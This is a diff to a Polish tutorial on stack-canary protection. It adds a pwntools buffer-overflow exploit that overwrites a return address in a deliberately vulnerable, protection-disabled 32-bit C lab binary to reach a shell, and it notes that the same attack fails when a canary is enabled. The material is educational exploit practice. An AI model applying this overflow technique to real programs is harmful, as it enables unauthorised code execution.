@@ -38,6 +38,9 @@ Oczywiście wyciek pamięci (`arbitrary read`) pozwala bardzo łatwo obejść ka
 
 Kod aplikacji podatnej jest taki sam, jaki  i exploit.
 
+- **PIE & ASLR**: wyłączony - opcje te pozwalają na stały adres funkcji - ułatwiają exploitacje.
+- **CANARY**: wyłączony - jest to idea tego exploitu.
+
 ```c
 // gcc vuln.c -no-pie -std=c99 -m32 -fno-stack-protector -z execstack -w -o vuln.o
 #include <stdio.h>
@@ -63,6 +66,9 @@ a   sk_for_name();
 return 0;
 }
 ```
+
+Exploit ten był już opisywany w poprzednich rozdziałach. Ładuje on pod adres powrotu adres funkcji `secret`
+
 Exploit:
 ```python
 from pwn import *
@@ -71,9 +77,14 @@ p = process("./vuln.o")
 
 p.readuntil("What's your name?\n")
 
-name = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO"
+
+name = b'AAAABBBBCCCCDDDDEEEEFFFF' # inject aaaas till eip
+name += b'\xc9\x61\x55\x56' 
 
 p.sendline(name)
+
+p.interactive()
+
 ```
 
 W tym przypadku przy kompilacji bez kanarka udaje się dostać shell.
@@ -83,6 +94,7 @@ W tym przypadku przy kompilacji bez kanarka udaje się dostać shell.
 A w przypadku kompilacji z kanarkiem nie udaje się - widzimy tutaj błąd, który wyrzucił kanarek.
 
 ![img_1.png](img/img_1.png)
+
 
 ### 1.4 Proof of concept - atak na kanarka
 
